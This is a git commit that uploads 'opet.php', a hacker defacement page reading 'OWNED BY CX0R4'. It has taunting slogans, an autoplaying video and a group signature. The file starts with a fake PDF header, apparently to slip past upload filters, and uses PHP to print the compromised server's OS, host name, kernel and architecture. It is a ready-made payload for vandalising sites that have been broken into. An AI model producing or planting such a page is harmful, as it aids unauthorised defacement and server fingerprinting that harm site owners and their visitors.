489b26a350a0a70e9d1560107731042e3a250d8b
CX0R4 <h4ppycutexploit@gmail.com>
2026-02-18 12:40:50 +0700

    Add files via upload

---
+++ opet.php
@@ -0,0 +1,104 @@
+<!%PDF-1.4!>
+<?php
+$os     = php_uname('s');
+$kernel = php_uname('r');
+$arch   = php_uname('m');
+$host   = php_uname('n');
+?>
+<!DOCTYPE html>
+<!!JANGAN LU RECODE BOCAH PANTEK!!>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OWNED BY CX0R4</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
+
+<style>
+body{
+    background:black;
+    color:#ccc;
+    font-family:monospace;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    margin:0;
+    text-align:center;
+}
+
+.container{
+    width:90%;
+    max-width:600px;
+}
+
+.root-line{
+    color:#fff;
+    font-size:14px;
+    margin-bottom:10px;
+}
+.root-line span{color:red;}
+
+video{
+    width:100%;
+    max-width:550px;
+    border-radius:10px;
+}
+
+.hacked-title{
+    font-family:'Metal Mania', cursive;
+    color:red;
+    font-size:30px;
+    margin-top:15px;
+    letter-spacing:2px;
+}
+
+.content{
+    font-size:16px;
+    margin:6px 0;
+}
+
+.server-info{
+    color:white;
+    font-size:13px;
+    margin-top:10px;
+    font-style:italic;
+}
+
+.footer{
+    color:red;
+    font-weight:bold;
+    margin-top:12px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="root-line">
+root@cx0r4:~# <span>./silent_mode</span>
+</div>
+
+<video autoplay muted loop playsinline>
+<source src="https://cutexploit.github.io/musik-player/1cf3c977084c14b447324745d467375a_720w.mp4" type="video/mp4">
+</video>
+
+<h1 class="hacked-title">OWNED BY CX0R4</h1>
+
+<p class="content">I didn't come to destroy, I came to prove...</p>
+<p class="content">Everything you trust is just an illusion.</p>
+
+<div class="server-info">
+<?= $os ?> <?= $host ?> | Kernel <?= $kernel ?> (<?= $arch ?>)
+</div>
+
+<div class="footer">
+--=={ Padang Blackhat - Indonesian Hacker Rulez - Cyber Alpha Wolf }==--
+</div>
+
+</div>
+
+</body>
+</html>
